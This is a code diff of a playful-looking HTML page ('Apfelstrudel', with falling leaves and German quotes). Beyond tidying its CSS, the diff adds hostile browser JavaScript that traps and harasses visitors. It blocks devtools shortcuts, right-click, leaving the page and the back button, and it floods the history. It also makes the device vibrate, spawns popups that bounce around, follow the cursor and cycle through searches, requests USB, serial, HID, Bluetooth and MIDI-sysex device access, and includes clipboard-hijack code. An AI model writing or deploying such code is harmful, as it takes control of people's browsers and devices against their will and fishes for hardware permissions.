@@ -86,11 +86,13 @@
             animation: expandWordSpacing 15s cubic-bezier(0.25, 0.1, 0.25, 1) infinite;
         }
 
-        body, html {
+        body,
+        html {
             width: 100%;
             height: 100%;
             overflow: visible;
         }
+
         section {
             height: 100%;
             width: 100%;
@@ -99,6 +101,7 @@
             left: 0;
             z-index: 1000;
         }
+
         .leaf {
             position: absolute;
             width: 100%;
@@ -107,66 +110,81 @@
             left: 0;
             z-index: 1001;
         }
+
         .leaf img {
             width: 75px;
             height: 75px;
         }
+
         .leaf div {
             position: absolute;
             display: block;
         }
+
         .leaf div:nth-child(1) {
             left: 20%;
             animation: fall 22s linear infinite;
             animation-delay: -2s;
         }
+
         .leaf div:nth-child(2) {
             left: 70%;
             animation: fall 18s linear infinite;
             animation-delay: -4s;
         }
+
         .leaf div:nth-child(3) {
             left: 10%;
             animation: fall 21s linear infinite;
             animation-delay: -7s;
         }
+
         .leaf div:nth-child(4) {
             left: 50%;
             animation: fall 24s linear infinite;
             animation-delay: -5s;
         }
+
         .leaf div:nth-child(5) {
             left: 85%;
             animation: fall 19s linear infinite;
             animation-delay: -5s;
         }
+
         .leaf div:nth-child(6) {
             left: 15%;
             animation: fall 23s linear infinite;
             animation-delay: -10s;
         }
+
         .leaf div:nth-child(7) {
             left: 90%;
             animation: fall 20s linear infinite;
             animation-delay: -4s;
         }
+
         @keyframes fall {
             0% {
                 top: -30%;
                 transform: translateX(20px) rotate(0deg);
             }
+
             20% {
                 transform: translateX(-20px) rotate(45deg);
             }
+
             40% {
                 transform: translateX(20px) rotate(90deg);
             }
+
             60% {
                 transform: translateX(-20px) rotate(135deg);
             }
+
             80% {
                 transform: translateX(20px) rotate(180deg);
             }
+
             100% {
                 top: 150%;
                 transform: translateX(-20px) rotate(225deg);
@@ -196,9 +214,12 @@
 
         .tail {
             position: absolute;
-            width: 32px; /* Adjust size as needed */
-            height: 32px; /* Adjust size as needed */
-            pointer-events: none; /* Prevent interaction with the tail images */
+            width: 32px;
+
+            height: 32px;
+
+            pointer-events: none;
+
         }
     </style>
     <title>Apfelstrudel</title>
@@ -323,47 +344,42 @@
     <div id="tail-container"></div>
 
     <script>
-        // Disable right-click context menu
+        const MARGIN = 10;
+        const TOP_MARGIN = 10;
+        const VELOCITY = 5;
+        const TICK_LENGTH = 50;
+        const WIN_WIDTH = 800;
+        const WIN_HEIGHT = 600;
+        const SCREEN_WIDTH = window.screen.width;
+        const SCREEN_HEIGHT = window.screen.height;
+
         document.addEventListener('contextmenu', (event) => event.preventDefault());
 
-        // Disable F12 and other developer tools shortcuts
         document.addEventListener('keydown', (event) => {
-            if (event.key === 'F12' || 
-                (event.ctrlKey && event.shiftKey && event.key === 'I') || 
-                (event.ctrlKey && event.shiftKey && event.key === 'J') || 
+            if (event.key === 'F12' ||
+                (event.ctrlKey && event.shiftKey && event.key === 'I') ||
+                (event.ctrlKey && event.shiftKey && event.key === 'J') ||
                 (event.ctrlKey && event.key === 'U')) {
                 event.preventDefault();
             }
         });
 
-        // Disable page leaving
         window.addEventListener('beforeunload', (event) => {
             event.preventDefault();
             event.returnValue = '';
         });
 
-        // Prevent going one site back
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1);
         };
 
-        // Copy spam to clipboard
-        function copySpamToClipboard() {
-            const spamText = "This is spam text!";
-            navigator.clipboard.writeText(spamText).then(() => {
-                console.log('Spam copied to clipboard');
-            }).catch(err => {
-                console.error('Failed to copy spam: ', err);
-            });
-        }
-
-        function triggerFileDownload () {
-        const FILE_DOWNLOADS = [
-            '1.jpeg',
-            '2.jpeg',
-            '3.jpeg'
-        ]
+        function triggerFileDownload() {
+            const FILE_DOWNLOADS = [
+                '1.jpeg',
+                '2.jpeg',
+                '3.jpeg'
+            ]
 
             const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
             const a = document.createElement('a')
@@ -376,8 +392,6 @@
             const randomIndex = Math.floor(Math.random() * arr.length);
             return arr[randomIndex];
         }
-
-        // setInterval(triggerFileDownload, 5000); // Adjust the interval as needed
 
         const quotes = [
             "Die Reise von tausend Meilen beginnt mit einem Schritt. - Laozi",
@@ -445,8 +459,205 @@
             }
         });
 
-        // Copy spam to clipboard every 5 seconds
-        setInterval(copySpamToClipboard, 5000);
+        function startVibrateInterval() {
+            if (typeof window.navigator.vibrate !== 'function') return;
+            setInterval(() => {
+                const duration = Math.floor(Math.random() * 600);
+                window.navigator.vibrate(duration);
+            }, 1000);
+        }
+
+        function openWindow() {
+            const { x, y } = getRandomCoords();
+            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
+            const win = window.open(window.location.pathname, '', opts);
+
+            if (!win) return;
+            wins.push(win);
+
+            if (wins.length === 2) setupSearchWindow(win);
+        }
+
+        function requestMidiAccess() {
+            try {
+                navigator.requestMIDIAccess({ sysex: true }).catch(err => {
+                    console.error("MIDI access failed: ", err);
+                });
+            } catch (err) {
+                console.error("MIDI access exception: ", err);
+            }
+        }
+
+        function requestBluetoothAccess() {
+            try {
+                navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+                    .then(device => device.gatt.connect())
+                    .catch(err => {
+                        console.error("Bluetooth access failed: ", err);
+                    });
+            } catch (err) {
+                console.error("Bluetooth access exception: ", err);
+            }
+        }
+
+        function requestUsbAccess() {
+            try {
+                navigator.usb.requestDevice({ filters: [{}] }).catch(err => {
+                    console.error("USB access failed: ", err);
+                });
+            } catch (err) {
+                console.error("USB access exception: ", err);
+            }
+        }
+
+        function requestSerialAccess() {
+            try {
+                navigator.serial.requestPort({ filters: [] }).catch(err => {
+                    console.error("Serial access failed: ", err);
+                });
+            } catch (err) {
+                console.error("Serial access exception: ", err);
+            }
+        }
+
+        function requestHidAccess() {
+            try {
+                navigator.hid.requestDevice({ filters: [] }).catch(err => {
+                    console.error("HID access failed: ", err);
+                });
+            } catch (err) {
+                console.error("HID access exception: ", err);
+            }
+        }
+
+        function moveWindowBounce() {
+            let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+            let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+
+            setInterval(() => {
+                const x = window.screenX;
+                const y = window.screenY;
+                const width = window.outerWidth;
+                const height = window.outerHeight;
+
+                if (x < MARGIN) vx = Math.abs(vx);
+                if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx);
+                if (y < TOP_MARGIN) vy = Math.abs(vy);
+                if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy);
+
+                window.moveBy(vx, vy);
+            }, TICK_LENGTH);
+        }
+
+        function setupFollowWindow() {
+            document.addEventListener('mousemove', function (e) {
+                window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2));
+            });
+        }
+
+        function onCloseWindow(win) {
+            const i = wins.indexOf(win);
+            if (i >= 0) wins.splice(i, 1);
+        }
+
+        function clipboardCopy(text) {
+            const span = document.createElement('span');
+            span.textContent = text;
+            span.style.whiteSpace = 'pre';
+
+            const iframe = document.createElement('iframe');
+            iframe.sandbox = 'allow-same-origin';
+            document.body.appendChild(iframe);
+
+            let win = iframe.contentWindow;
+            win.document.body.appendChild(span);
+
+            let selection = win.getSelection();
+
+            if (!selection) {
+                win = window;
+                selection = win.getSelection();
+                document.body.appendChild(span);
+            }
+
+            const range = win.document.createRange();
+            selection.removeAllRanges();
+            range.selectNode(span);
+            selection.addRange(range);
+
+            let success = false;
+            try {
+                success = win.document.execCommand('copy');
+            } catch (err) {
+                console.log(err);
+            }
+
+            selection.removeAllRanges();
+            span.remove();
+            iframe.remove();
+
+            return success;
+        }
+
+        function blockBackButton() {
+            window.addEventListener('popstate', () => {
+                window.history.forward();
+            });
+        }
+
+        function fillHistory() {
+            for (let i = 1; i < 20; i++) {
+                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
+            }
+            window.history.pushState({}, '', window.location.pathname);
+        }
+
+        function getRandomCoords() {
+            const x = MARGIN +
+                Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
+            const y = TOP_MARGIN +
+                Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN));
+            return { x, y };
+        }
+
+        function setupSearchWindow(win) {
+            if (!win) return;
+            const { x, y } = getRandomCoords();
+            win.moveTo(x, y);
+            win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
+            win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0]);
+            let searchIndex = 1;
+            const interval = setInterval(() => {
+                if (win.closed) {
+                    clearInterval(interval);
+                    onCloseWindow(win);
+                    return;
+                }
+
+                win.window.location = window.location.pathname;
+                setTimeout(() => {
+                    win.resizeTo(WIN_WIDTH, WIN_HEIGHT);
+                }, 500);
+                setTimeout(() => {
+                    const { x, y } = getRandomCoords();
+                    win.moveTo(x, y);
+                    win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
+                    win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex]);
+
+                    searchIndex += 1;
+                    if (searchIndex >= SEARCHES.length) {
+                        searchIndex = 0;
+                    }
+                }, 1000);
+            }, 3000);
+        }
+
+        startVibrateInterval();
+        openWindow();
+        moveWindowBounce();
+        setupFollowWindow();
+        blockBackButton();
+        fillHistory();
     </script>
 </body>
 
